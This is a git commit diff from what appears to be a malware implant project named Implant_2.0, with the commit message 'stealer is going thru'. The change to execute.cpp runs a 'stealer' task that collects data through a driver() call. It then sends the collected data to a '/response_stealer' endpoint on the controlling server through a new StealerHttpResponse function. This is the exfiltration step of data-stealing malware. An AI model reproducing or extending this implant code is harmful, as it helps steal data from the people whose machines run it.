c9dca191df0a621128fd9b128ded251b48b3bf07
xakojwm <wyattmorris@crc-dot1x-nat-10-239-179-224.bu.edu>
2022-12-17 20:36:58 -0500

    stealer is going thru

--- Implant_2.0/execute/execute.cpp
+++ Implant_2.0/execute/execute.cpp
@@ -114,11 +114,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             json data_from_driver;
             printf("Executing Stealer\n");
             data_from_driver = driver();
-            results = data_from_driver.dump(); 
+            //results = data_from_driver.dump(); 
 
             printf("WE GOT RESULTS \n");             
 
-            HttpResponse("/response_stealer", implant_id, task_id, results, "success", command);
+            StealerHttpResponse("/response_stealer", implant_id, task_id, data_from_driver, "success", command);
 
             printf("SENT SUCCESS \n");
         }
